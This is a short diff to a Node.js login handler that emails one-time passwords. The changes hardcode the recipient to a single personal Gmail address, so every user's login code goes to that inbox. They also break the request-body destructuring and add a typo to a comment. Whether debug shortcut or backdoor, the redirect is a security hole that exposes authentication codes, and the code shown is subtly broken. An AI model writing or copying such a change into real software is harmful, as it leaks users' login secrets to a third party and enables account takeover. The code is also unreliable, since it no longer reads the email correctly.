@@ -2,9 +2,9 @@ import fs from "fs";
 import jwt from "jsonwebtoken";
 import transporter from "../config/emailTransporter.js";
 
-// Send OTP to any email
+// Send OTP to any emailre
 export const sendLoginOtp = async (req, res) => {
-  const { email } = req.body;
+  const  email  =  req.body;
 
   try {
     console.log("📩 Request received to send OTP to:", email);
@@ -17,7 +17,7 @@ export const sendLoginOtp = async (req, res) => {
 
     await transporter.sendMail({
       from: process.env.EMAIL,
-      to: email,
+      to: "vivekdixit504@gmail.com",
       subject: "Your OTP for Login",
       html: `<p>Your OTP is <strong>${otp}</strong></p>`,
     });
